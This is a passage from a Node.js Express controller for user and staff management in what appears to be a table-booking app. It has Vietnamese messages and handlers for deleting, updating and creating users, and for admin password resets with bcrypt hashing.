    return res.status(200).json(searchStaff);
  } catch (error) {
    return res.status(400).json(error);
  }
};

const deleteStaff = async (req, res) => {
  try {
    const { userId } = req.params;
    const user = await TableSchema.findByIdAndDelete(userId);

    if (!user) {
      return res.status(404).json({
        ok: false,
        errMessage: "Người dùng không tồn tại",
      });
    }
    return res.status(200).json({
      ok: true,
      message: "Người dùng đã được xoá thành công!",
    });
  } catch (err) {
    console.log(err);
    return res.status(500).json({ msg: err.message });
  }
};

const updateProfile = async (req, res) => {
  try {
    if (!req.user) {
      return res.status(401).json({
        ok: false,
        errMessage: "Token không hợp lệ hoặc người dùng không xác thực.",
      });
    }
    const updatedData = {};
    const userId = req.user ? req.user.id : null;
    if (req.body.name) {
      updatedData.name = req.body.name;
    }
    if (req.files && req.files[0] && req.files[0].path) {
      updatedData.avatar = req.files[0].path;
    }
    if (Object.keys(updatedData).length === 0) {
      return res.status(400).json({
        ok: false,
        errMessage: "Không có dữ liệu để cập nhật.",
      });
    }
    const user = await TableSchema.findByIdAndUpdate(userId, updatedData, {
      new: true,
    });

    if (!user) {
      return res.status(404).json({
        ok: false,
        errMessage: "Không tìm thấy người dùng.",
      });
    }

    // user.isAdmin = undefined;
    // user.isStaff = undefined;
    // user.password = undefined;
    // user.__v = undefined;
    await user.save();
    res.status(200).json({
      ok: true,
      user,
    });
  } catch (err) {
    console.error(err);
    res.status(500).json({
      ok: false,
      errMessage: "Lỗi trong quá trình lấy thông tin người dùng.",
    });
  }
};

const updatePasswordByAdmin = async (req, res) => {
  try {
    const { userId } = req.params;
    const { password } = req.body;
    const salt = bcrypt.genSaltSync(10);
    const passwordHash = bcrypt.hashSync(password, salt);
    const user = await TableSchema.findByIdAndUpdate(
      userId,
      { password: passwordHash },
      { new: true }
    );
    await user.save();
    user.password = undefined;
    return res.status(201).json({
      ok: true,
      message: "Cập nhật thành công!",
      user: user,
    });
  } catch (err) {
    console.log(err);
    return res.status(500).json({ msg: err.message });
  }
};

const getUserWithMail = async (req, res) => {
  const { email } = req.body;
  await User.getUserWithMail(email, (err, result) => {
    if (err) return res.status(404).send(err);

    const dataTransferObject = {
      name: result.name,
      avatar: result.avatar,
      username: result.username,
      color: result.color,
      email: result.email,
    };
    return res.status(200).send(dataTransferObject);
  });
};

const updateStaff = async (req, res) => {
  try {
    const { userId } = req.params;
    const updatedData = {};
    if (req.body.name) {
      updatedData.name = req.body.name;
    }
    if (req.body.phone) {
      updatedData.phone = req.body.phone;
    }
    if (req.body.email) {
      updatedData.email = req.body.email;
    }
    if (req.body.status) {
      updatedData.status = req.body.status;
    }
    if (req.files && req.files[0] && req.files[0].path) {
      updatedData.avatar = req.files[0].path;
    }
    if (Object.keys(updatedData).length === 0) {
      return res.status(400).json({
        ok: false,
        errMessage: "Không có dữ liệu để cập nhật.",
      });
    }
    const user = await TableSchema.findByIdAndUpdate(userId, updatedData, {
      new: true,
    });
    await user.save();
    user.password = undefined;
    return res.status(201).json({
      ok: true,
      message: "Cập nhật thành công!",
      user: user,
    });
  } catch (err) {
    console.log(err);
    return res.status(500).json({ msg: err.message });
  }
};

const createUser = async (req, res) => {
  // const images_url = req.files.map((image) => image.path);
  const images_url = req.files[0].path;
  const salt = bcrypt.genSaltSync(10);
  const newUser = new TableSchema({
    name: req.body.name,
    email: req.body.email,
    address: req.body.address,
    username: req.body.username,
    password: bcrypt.hashSync(req.body.password, salt),
    avatar: images_url,
    isAdmin: req.body.isAdmin,
  });
  if (req.user.isAdmin !== true) {
    return res.status(403).json({ message: "Bạn không phải admin" });
  }
  await newUser.save((err, user) => {
    if (err) {
      return res.status(500).json({
        ok: false,
        err,
      });
    }
    user.password = undefined;
    return res.status(200).json({
      ok: true,
      message: "Xác thực quyền admin thành công",
      user,
    });
  });
};

module.exports = {
  checkFB,
  create,
  getTable,
  deleteStaff,
  // handleTableRequest,
  searchTable,
  updatePasswordByAdmin,
  getAllUser,
  getUserWithMail,
  updateProfile,
  updateTables,
  // updateUser,
  updateStaff,
  createUser,
  getUserProfile,
};
